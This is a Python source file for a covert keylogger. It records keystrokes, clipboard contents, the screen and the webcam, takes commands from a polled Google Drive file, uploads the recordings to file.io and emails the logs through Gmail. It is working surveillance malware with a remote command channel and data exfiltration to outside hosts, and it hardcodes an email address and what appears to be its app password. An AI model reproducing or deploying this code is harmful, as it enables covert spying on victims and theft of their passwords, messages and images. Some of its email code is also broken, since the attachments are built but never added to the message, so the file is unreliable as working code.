import os
import logging
import time
import threading
import pyperclip
import pyautogui
import cv2
import numpy as np
import requests
from datetime import datetime
import socket
import ctypes
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener, Key, KeyCode

# Logging configuration
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
logging.basicConfig(
    filename=os.path.join(LOG_DIR, "keylog.txt"),
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
)
logging.getLogger("requests").setLevel(logging.ERROR)
logging.getLogger("urllib3").setLevel(logging.ERROR)

# Google Drive Public URL for command.txt (Replace with your public file URL)
COMMAND_FILE_URL = "https://drive.google.com/uc?export=download&id=1wLxOpmHKwZOLq4iDBLIAG5L-mpTV-1BQ"  # Replace with your public file URL

# Numpad key mapping
numpad_keys = {
    KeyCode.from_char('1'): 'Numpad 1',
    KeyCode.from_char('2'): 'Numpad 2',
    KeyCode.from_char('3'): 'Numpad 3',
    KeyCode.from_char('4'): 'Numpad 4',
    KeyCode.from_char('5'): 'Numpad 5',
    KeyCode.from_char('6'): 'Numpad 6',
    KeyCode.from_char('7'): 'Numpad 7',
    KeyCode.from_char('8'): 'Numpad 8',
    KeyCode.from_char('9'): 'Numpad 9',
    KeyCode.from_char('0'): 'Numpad 0',
    KeyCode.from_char('+'): 'Numpad +',
    KeyCode.from_char('-'): 'Numpad -',
    KeyCode.from_char('*'): 'Numpad *',
    KeyCode.from_char('/'): 'Numpad /',
    KeyCode.from_char('.'): 'Numpad .',
}

# Function to lock the screen using Windows API
def lock_screen():
    ctypes.windll.user32.LockWorkStation()
    logging.info("Screen locked!")

# Function to check for commands in the Google Drive file (checking for lock_screen)
def check_commands_from_drive():
    while True:
        try:
            response = requests.get(COMMAND_FILE_URL)
            if response.status_code == 200:
                command_content = response.text.strip().lower()

                if command_content == "stop":
                    logging.info("Stop command received. Terminating keylogger.")
                    upload_files_to_fileio()  # Upload video files to File.io before stopping
                    os._exit(0)  # Terminate the program

                elif command_content == "start_front_camera":
                    logging.info("Front camera start command received.")
                    threading.Thread(target=record_front_camera, daemon=True).start()

                elif command_content == "lock_screen":
                    logging.info("Lock screen command received.")
                    lock_screen()

        except requests.exceptions.RequestException as e:
            logging.error(f"Error fetching file from Google Drive: {e}")
        
        time.sleep(2)  # Check every 2 seconds

# Function to log keystrokes
def log_keystrokes():
    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char:
                logging.info(str(key.char))
            else:  # Handle special keys
                if key in numpad_keys:
                    logging.info(f"Key pressed: {numpad_keys[key]}")
                elif key == Key.enter:
                    logging.info("[Enter]")
                elif key == Key.space:
                    logging.info("[Space]")
                elif key == Key.shift:
                    logging.info("[Shift]")
                elif key == Key.caps_lock:
                    logging.info("[Caps Lock]")
                elif key == Key.tab:
                    logging.info("[Tab]")
                elif key == Key.esc:
                    logging.info("[Esc]")
                else:
                    logging.info(f"[{str(key)}]")
        except Exception as e:
            logging.error(f"Error logging key: {e}")

    with Listener(on_press=on_press) as listener:
        listener.join()

# Function to log clipboard data
def log_clipboard():
    last_clipboard = ""
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipboard:
                last_clipboard = current_clipboard
                with open(os.path.join(LOG_DIR, "clipboard.txt"), "a") as f:
                    f.write(f"{datetime.now()}: {current_clipboard}\n")
        except Exception as e:
            logging.error(f"Error logging clipboard: {e}")
        time.sleep(5)

# Function to record screen continuously
def record_screen():
    screen_width, screen_height = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    video_path = os.path.join(LOG_DIR, "screen_recording.avi")
    video_writer = cv2.VideoWriter(video_path, fourcc, 20.0, (screen_width, screen_height))
    
    frame_rate = 1 / 20.0  # 20 fps (adjust if necessary)
    
    while True:
        start_time = time.time()
        
        try:
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            video_writer.write(frame)
        except Exception as e:
            logging.error(f"Error recording screen: {e}")
        
        elapsed_time = time.time() - start_time
        time_to_wait = frame_rate - elapsed_time
        if time_to_wait > 0:
            time.sleep(time_to_wait)

    video_writer.release()

# Function to record front camera
def record_front_camera():
    cap = cv2.VideoCapture(0)
    
    if not cap.isOpened():
        cap = cv2.VideoCapture(1)

    if not cap.isOpened():
        logging.error("Error: Could not open any camera.")
        return

    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    video_path = os.path.join(LOG_DIR, "front_camera_recording.avi")
    video_writer = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))

    while True:
        ret, frame = cap.read()
        if not ret:
            logging.error("Error: Failed to capture frame from front camera.")
            break
        video_writer.write(frame)

    cap.release()
    video_writer.release()

# Function to upload files to File.io and send email
def upload_files_to_fileio():
    try:
        file_links = []

        # Upload screen recording
        video_file_path = os.path.join(LOG_DIR, "screen_recording.avi")
        if os.path.exists(video_file_path):
            link = upload_to_fileio(video_file_path)
            file_links.append(link)

        # Upload front camera recording
        front_camera_path_file = os.path.join(LOG_DIR, "front_camera_recording.avi")
        if os.path.exists(front_camera_path_file):
            link = upload_to_fileio(front_camera_path_file)
            file_links.append(link)

        # Send email with links
        send_email(file_links)

    except Exception as e:
        logging.error(f"Error uploading files to File.io or sending email: {e}")

# Function to upload file to File.io and return download link
def upload_to_fileio(file_path):
    url = "https://file.io"
    with open(file_path, "rb") as file:
        files = {"file": file}
        response = requests.post(url, files=files)
        if response.status_code == 200:
            file_info = response.json()
            download_link = file_info.get("link")
            logging.info(f"File uploaded successfully! Download link: {download_link}")
            return download_link
        else:
            logging.error(f"Error uploading file {file_path} to File.io")
            return None

# Function to send an email with the logs and other files
def send_email(file_links):
    from_email = "shaiqhussain01@gmail.com"  # Your email
    to_email = "shaiqhussain01@gmail.com"  # Recipient's email
    subject = "Keylogger Logs and Files"

    # Create the email message
    msg = MIMEMultipart()
    msg["From"] = from_email
    msg["To"] = to_email
    msg["Subject"] = subject

    # Attach files
    attach_keylog = attach_file_to_email("keylog.txt", os.path.join(LOG_DIR, "keylog.txt"))
    attach_clipboard = attach_file_to_email("clipboard.txt", os.path.join(LOG_DIR, "clipboard.txt"))

    for file in file_links:
        attach_file_to_email(file, file)

    # Send the email
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(from_email, "bjnk saio vukk flny")  # Replace with your email password
            server.sendmail(from_email, to_email, msg.as_string())
            logging.info("Email sent successfully!")
    except Exception as e:
        logging.error(f"Error sending email: {e}")

# Attach file helper function
def attach_file_to_email(filename, filepath):
    with open(filepath, "rb") as f:
        file_attachment = MIMEBase("application", "octet-stream")
        file_attachment.set_payload(f.read())
        encoders.encode_base64(file_attachment)
        file_attachment.add_header("Content-Disposition", f"attachment; filename={filename}")
        return file_attachment

# Main entry point
if __name__ == "__main__":
    try:
        # Start threads for keylogger, clipboard, and screen recording
        threading.Thread(target=log_keystrokes, daemon=True).start()
        threading.Thread(target=log_clipboard, daemon=True).start()
        threading.Thread(target=record_screen, daemon=True).start()
        threading.Thread(target=check_commands_from_drive, daemon=True).start()

        while True:
            time.sleep(10)

    except Exception as e:
        logging.error(f"Error starting keylogger: {e}")
